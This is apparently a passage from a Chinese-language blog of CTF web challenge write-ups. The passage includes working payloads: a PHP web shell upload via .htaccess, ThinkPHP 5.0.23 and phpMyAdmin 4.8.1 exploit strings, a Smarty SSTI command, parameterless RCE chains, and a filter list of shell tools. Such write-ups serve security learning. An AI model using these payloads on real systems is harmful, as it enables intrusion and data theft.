class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>FlagController<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">url-pattern</span>&gt;</span>/Flag<span class=\"tag\">&lt;/<span class=\"name\">url-pattern</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">servlet-mapping</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>注意到了一个<code>FlagController</code>的控制器，它所在的类为<code>com.wm.ctf.FlagController</code>，前面也提到了编译文件所在的文件夹<code>/WEB-INF/classes/</code>，去这个文件夹下载<code>FlagController</code>相关的文件，还需要知道的是：Javaweb程序编译文件的目录结构是根据类名创建的，类名我们也知道了，所以下载：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">filename=WEB-INF/classes/com/wm/ctf/FlagController.class</span><br></pre></td></tr></table></figure>\n\n<p>class文件源码好多不可见字符</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310112205.png\"></p>\n<p>我选中的那段就是flag在的地方，看到了<code>==</code>就应该意识到是base64编码，但是base64编码里没有<code>&lt;</code>这个字符，所以flag的密文就是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ZmxhZ3s0NmNhMTExMS01ZjI5LTQwYjMtYjUwMC1lYWMzZjkyMjU4ODF9Cg==</span><br></pre></td></tr></table></figure>\n\n\n\n<hr>\n<h1 id=\"———————–以下部分施工中👷‍♂️————————\"><a href=\"#———————–以下部分施工中👷‍♂️————————\" class=\"headerlink\" title=\"———————–以下部分施工中👷‍♂️————————\"></a>———————–以下部分施工中👷‍♂️————————</h1><p>下面的都是没有整理，先把重要思路写下来了，然后有时间再配图</p>\n<hr>\n<h1 id=\"GKCTF2020-cve版签到\"><a href=\"#GKCTF2020-cve版签到\" class=\"headerlink\" title=\"[GKCTF2020]cve版签到\"></a>[GKCTF2020]cve版签到</h1><p><a href=\"https://blog.csdn.net/qq_45521281/article/details/106425266\">CVE-2020-7066</a></p>\n<p>只有一个按钮，点击以后查看网页的Network请求中有一个</p>\n<blockquote>\n<p>Hint: Flag in localhost</p>\n</blockquote>\n<p>且utl地址中有可控的参数，所以应该是使用ssrf。这里还有一个提示是在主页面那里</p>\n<blockquote>\n<p>You just view *.ctfhub.com</p>\n</blockquote>\n<p>只可以访问以ctfhub.com结尾的网站，再根据cve使用%00截断访问：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?url=http://127.0.0.1%00.ctfhub.com</span><br></pre></td></tr></table></figure>\n\n<p>第二个提示：</p>\n<blockquote>\n<p>Host must be end with ‘123’</p>\n</blockquote>\n<p>必须以123结尾，所以最终payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?url=http://127.0.0.123%00.ctfhub.com</span><br></pre></td></tr></table></figure>\n\n\n\n<hr>\n<h1 id=\"GXYCTF2019-禁止套娃\"><a href=\"#GXYCTF2019-禁止套娃\" class=\"headerlink\" title=\"[GXYCTF2019]禁止套娃\"></a>[GXYCTF2019]禁止套娃</h1><p>git泄露。我使用的<a href=\"https://github.com/gakki429/Git_Extract\">https://github.com/gakki429/Git_Extract</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">include &quot;flag.php&quot;;</span><br><span class=\"line\">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class=\"line\">if(isset($_GET[&#x27;exp&#x27;]))&#123;</span><br><span class=\"line\">    if (!preg_match(&#x27;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class=\"line\">        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class=\"line\">            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class=\"line\">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class=\"line\">                @eval($_GET[&#x27;exp&#x27;]);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            else&#123;</span><br><span class=\"line\">                die(&quot;还差一点哦！&quot;);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        else&#123;</span><br><span class=\"line\">            die(&quot;再好好想想！&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else&#123;</span><br><span class=\"line\">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// highlight_file(__FILE__);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>正则表达式匹配的只有函数的形式如<code>var_dump();</code>是一道<a href=\"https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/\">无参数RCE</a>，看的题解自己整理的payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?exp=var_dump(readfile(array_rand(array_flip(scandir(current(localeconv()))))));</span><br></pre></td></tr></table></figure>\n\n<p>一层一层解释：</p>\n<p>localeconv() 函数返回一包含本地数字及货币格式信息的数组</p>\n<p><strong>图片展示</strong></p>\n<p>current() 返回数组中的当前单元, 默认取第一个值。别名pos()</p>\n<p>到这里获得的是一个点</p>\n<p>scandir() 遍历目录，是<code>.</code>的话就是列出当前目录。</p>\n<p>此时输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">array(5) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(4) &quot;.git&quot; [3]=&gt; string(8) &quot;flag.php&quot; [4]=&gt; string(9) &quot;index.php&quot; &#125;</span><br></pre></td></tr></table></figure>\n\n<p>这时的输出还是键值对的形式，我们需要使用<code>array_flip()</code>函数交换键值对，然后使用随机函数<code>array_rand()</code>从数组中随机取出一个或多个单元。因为正则的原因无法使用<code>file_get_contents()</code>，但是还有其他读取文件的函数:readfile()、highlight_file()和它的别名函数show_source()。</p>\n<hr>\n<h1 id=\"GXYCTF2019-BabyUpload\"><a href=\"#GXYCTF2019-BabyUpload\" class=\"headerlink\" title=\"[GXYCTF2019]BabyUpload\"></a>[GXYCTF2019]BabyUpload</h1><p>ph过滤，image/gif不能通过。image/jpe可以</p>\n<p>上传.htaccess</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>\n\n<p>上传码，但是不能是php代码，使用js</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<p>完工</p>\n<hr>\n<h1 id=\"BJDCTF-2nd-old-hack\"><a href=\"#BJDCTF-2nd-old-hack\" class=\"headerlink\" title=\"[BJDCTF 2nd]old-hack\"></a>[BJDCTF 2nd]old-hack</h1><p>ThinkPHP的<a href=\"https://blog.csdn.net/qq_38807738/article/details/86777541\">漏洞</a></p>\n<p>ThinkPHP5 5.0.23</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=cat /flag</span><br></pre></td></tr></table></figure>\n\n\n\n<hr>\n<h1 id=\"安洵杯-2019-easy-web\"><a href=\"#安洵杯-2019-easy-web\" class=\"headerlink\" title=\"[安洵杯 2019]easy_web\"></a>[安洵杯 2019]easy_web</h1><p>看url一个img和cmd，页面中有一个图片的标签，和一个**md5 is funny ~**。把url中img的值进行解码发现图片名为<code>555.png</code>，尝试用同样的编码方式读取index.php，加密的编码依次为：hex–&gt;base64–&gt;base64。</p>\n<p>index.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class=\"line\">header(&#x27;content-type:text/html;charset=utf-8&#x27;);</span><br><span class=\"line\">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class=\"line\">if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;])) </span><br><span class=\"line\">    header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);</span><br><span class=\"line\">$file = hex2bin(base64_decode(base64_decode($_GET[&#x27;img&#x27;])));</span><br><span class=\"line\"></span><br><span class=\"line\">$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);</span><br><span class=\"line\">if (preg_match(&quot;/flag/i&quot;, $file)) &#123;</span><br><span class=\"line\">    echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;;</span><br><span class=\"line\">    die(&quot;xixi～ no flag&quot;);</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    $txt = base64_encode(file_get_contents($file));</span><br><span class=\"line\">    echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;;</span><br><span class=\"line\">    echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">echo $cmd;</span><br><span class=\"line\">echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#x27;|\\&quot;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;</span><br><span class=\"line\">    echo(&quot;forbid ~&quot;);</span><br><span class=\"line\">    echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123;</span><br><span class=\"line\">        echo `$cmd`;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        echo (&quot;md5 is funny ~&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;style&gt;</span><br><span class=\"line\">  body&#123;</span><br><span class=\"line\">   background:url(./bj.png)  no-repeat center center;</span><br><span class=\"line\">   background-size:cover;</span><br><span class=\"line\">   background-attachment:fixed;</span><br><span class=\"line\">   background-color:#CCCCCC;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/style&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>我不知道为什么，我的bp一定要在<code>&amp;</code>前加一个空格才可以通过。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?cmd=uniq%20/flag</span><br><span class=\"line\"></span><br><span class=\"line\">POST</span><br><span class=\"line\">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class=\"line\">&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>\n\n<p>读文件的绕过有</p>\n<blockquote>\n<table>\n<thead>\n<tr>\n<th align=\"center\">1</th>\n<th>more:一页一页的显示档案内容</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">2</td>\n<td>less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页</td>\n</tr>\n<tr>\n<td align=\"center\">3</td>\n<td>head:查看头几行</td>\n</tr>\n<tr>\n<td align=\"center\">4</td>\n<td>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</td>\n</tr>\n<tr>\n<td align=\"center\">5</td>\n<td>tail:查看尾几行</td>\n</tr>\n<tr>\n<td align=\"center\">6</td>\n<td>nl：显示的时候，顺便输出行号</td>\n</tr>\n<tr>\n<td align=\"center\">7</td>\n<td>od:以二进制的方式读取档案内容</td>\n</tr>\n<tr>\n<td align=\"center\">8</td>\n<td>vi:一种编辑器，这个也可以查看</td>\n</tr>\n<tr>\n<td align=\"center\">9</td>\n<td>vim:一种编辑器，这个也可以查看</td>\n</tr>\n<tr>\n<td align=\"center\">10</td>\n<td>sort:可以查看</td>\n</tr>\n<tr>\n<td align=\"center\">11</td>\n<td>uniq:可以查看</td>\n</tr>\n<tr>\n<td align=\"center\">12</td>\n<td>file -f:报错出具体内容</td>\n</tr>\n</tbody></table>\n</blockquote>\n<p>摘自<a href=\"https://www.ghtwf01.cn/index.php/archives/273/\">命令执行漏洞利用及绕过方式总结</a>。</p>\n<hr>\n<h1 id=\"BJDCTF2020-Mark-loves-cat\"><a href=\"#BJDCTF2020-Mark-loves-cat\" class=\"headerlink\" title=\"[BJDCTF2020]Mark loves cat\"></a>[BJDCTF2020]Mark loves cat</h1><p>git泄露</p>\n<p>flag.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$flag = file_get_contents(&#x27;/flag&#x27;);</span><br></pre></td></tr></table></figure>\n\n<p>index.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">include &#x27;flag.php&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">$yds = &quot;dog&quot;;</span><br><span class=\"line\">$is = &quot;cat&quot;;</span><br><span class=\"line\">$handsome = &#x27;yds&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">foreach($_POST as $x =&gt; $y)&#123;</span><br><span class=\"line\">    $$x = $y;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class=\"line\">    $$x = $$y;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class=\"line\">    if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123;</span><br><span class=\"line\">        exit($handsome);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123;</span><br><span class=\"line\">    exit($yds); </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27;  || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123;</span><br><span class=\"line\">    exit($is);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">echo &quot;the flag is: &quot;.$flag;</span><br></pre></td></tr></table></figure>\n\n<p>尝试输出<code>$flag</code>即可。exit()函数退出时也会输出。</p>\n<p>第一个不可能实现，如果POST或GET传入flag的话必然导致<code>$flag</code>修改，那么正好符合第二个if。</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET</span><br><span class=\"line\">?yds=flag</span><br><span class=\"line\"></span><br><span class=\"line\">POST(任意，但是需要保证不传flag)</span><br><span class=\"line\">is=233flag</span><br></pre></td></tr></table></figure>\n\n\n\n<hr>\n<h1 id=\"BJDCTF2020-The-mystery-of-ip\"><a href=\"#BJDCTF2020-The-mystery-of-ip\" class=\"headerlink\" title=\"[BJDCTF2020]The mystery of ip\"></a>[BJDCTF2020]The mystery of ip</h1><p>hint.php里面有注释</p>\n<blockquote>\n<p>Do you know why i know your ip?</p>\n</blockquote>\n<p>去flag.php尝试加入请求头x-forward-x、client-ip发现ip可以改变。然后是自己感觉网页很简单，突破点在请求头中，尝试了下ssti模板注入，发现成功了。</p>\n<p>尝试了几个ssti的payload不行，但是提示了</p>\n<blockquote>\n<p>Uncaught –&gt; Smarty Compiler:…………………</p>\n</blockquote>\n<p>得知了这个是Smarty引擎，在网上尝试搜索这种类型的注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">请求：</span><br><span class=\"line\">X-Forwarded-For: &#123;system(&#x27;cat /flag&#x27;)&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><a href=\"https://github.com/epinna/tplmap\">SSTI神器–Tplmap</a>，看介绍是和sqlmap差不多的工具。</p>\n<p>这个师傅的博客写的很全：<a href=\"https://www.cnblogs.com/R3col/p/12746485.html%EF%BC%8C%E6%89%80%E6%9C%89%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8Epayload%E9%83%BD%E6%9C%89%EF%BC%8C%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%89%8D%E9%9C%80%E8%A6%81%E5%85%88%E7%A1%AE%E5%AE%9A%E7%B1%BB%E5%9E%8B%E3%80%82\">https://www.cnblogs.com/R3col/p/12746485.html，所有类型的模板引擎payload都有，注入之前需要先确定类型。</a></p>\n<p><a href=\"https://www.cnblogs.com/20175211lyz/p/11425368.html\">CTF SSTI(服务器模板注入)</a></p>\n<p><a href=\"https://xz.aliyun.com/t/3679/\">flask之ssti模版注入从零到入门</a></p>\n<hr>\n<h1 id=\"GWCTF-2019-我有一个数据库\"><a href=\"#GWCTF-2019-我有一个数据库\" class=\"headerlink\" title=\"[GWCTF 2019]我有一个数据库\"></a>[GWCTF 2019]我有一个数据库</h1><p>页面是乱码，想知道内容了可以看下图</p>\n<p>$$各种乱码图</p>\n<p>对照的是古文码。是以GBK方式读取UTF-8编码的中文，我举个例子，使用vscode，先通过编码保存–&gt;GBK，再通过编码打开–&gt;UTF-8。内容如下</p>\n<blockquote>\n<p>我有一个数据库，但里面什么也没有~<br>不信你找</p>\n</blockquote>\n<p>提示是数据库了，那么果断尝试PHPmyadmin，访问成功，然后查看下版本，去网上搜索对应版本的漏洞</p>\n<p><a href=\"https://www.secpulse.com/archives/72817.html\">phpmyadmin4.8.1后台getshell</a></p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/phpmyadmin/index.php?target=db_sql.php%253f../../../../../../flag</span><br></pre></td></tr></table></figure>\n\n<p>可以包含任意文件，理应可以包含数据库文件，在数据库表字段写shell，没成不知道数据库文件名称</p>\n<hr>\n<h1 id=\"2021-03-01\"><a href=\"#2021-03-01\" class=\"headerlink\" title=\"2021.03.01\"></a>2021.03.01</h1><hr>\n<h1 id=\"BJDCTF2020-ZJCTF，不过如此\"><a href=\"#BJDCTF2020-ZJCTF，不过如此\" class=\"headerlink\" title=\"[BJDCTF2020]ZJCTF，不过如此\"></a>[BJDCTF2020]ZJCTF，不过如此</h1><p>绕过</p>\n<p>第一层用php伪协议中的data封装流。<a href=\"https://segmentfault.com/a/1190000018991087\">PHP伪协议总结</a></p>\n<p>然后进入文件包含，提示包含next.php文件，还是使用php伪协议中的php://filter</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?text=data://text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure>\n\n<p>读出来的next.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PD9waHAKJGlkID0gJF9HRVRbJ2lkJ107CiRfU0VTU0lPTlsnaWQnXSA9ICRpZDsKCmZ1bmN0aW9uIGNvbXBsZXgoJHJlLCAkc3RyKSB7CiAgICByZXR1cm4gcHJlZ19yZXBsYWNlKAogICAgICAgICcvKCcgLiAkcmUgLiAnKS9laScsCiAgICAgICAgJ3N0cnRvbG93ZXIoIlxcMSIpJywKICAgICAgICAkc3RyCiAgICApOwp9CgoKZm9yZWFjaCgkX0dFVCBhcyAkcmUgPT4gJHN0cikgewogICAgZWNobyBjb21wbGV4KCRyZSwgJHN0cikuICJcbiI7Cn0KCmZ1bmN0aW9uIGdldEZsYWcoKXsKCUBldmFsKCRfR0VUWydjbWQnXSk7Cn0K</span><br></pre></td></tr></table></figure>\n\n<p>base64解码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$id = $_GET[&#x27;id&#x27;];</span><br><span class=\"line\">$_SESSION[&#x27;id&#x27;] = $id;</span><br><span class=\"line\"></span><br><span class=\"line\">function complex($re, $str) &#123;</span><br><span class=\"line\">    return preg_replace(</span><br><span class=\"line\">        &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,</span><br><span class=\"line\">        &#x27;strtolower(&quot;\\\\1&quot;)&#x27;,</span><br><span class=\"line\">        $str</span><br><span class=\"line\">    );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">foreach($_GET as $re =&gt; $str) &#123;</span><br><span class=\"line\">    echo complex($re, $str). &quot;\\n&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function getFlag()&#123;</span><br><span class=\"line\">\t@eval($_GET[&#x27;cmd&#x27;]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这里想要通过需要知道一个<a href=\"http://www.xinyueseo.com/websecurity/158.html\">深入研究 preg_replace /e 模式下的代码漏洞问题</a></p>\n<p>最终payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">next.php?\\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>\n\n\n\n<hr>\n<h1 id=\"De1CTF-2019-SSRF-Me\"><a href=\"#De1CTF-2019-SSRF-Me\" class=\"headerlink\" title=\"[De1CTF 2019]SSRF Me\"></a>[De1CTF 2019]SSRF Me</h1><p>进入页面是一堆源码，之前写过flask的可以大概理出来几个重要的点，但是还是贴一下源码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span 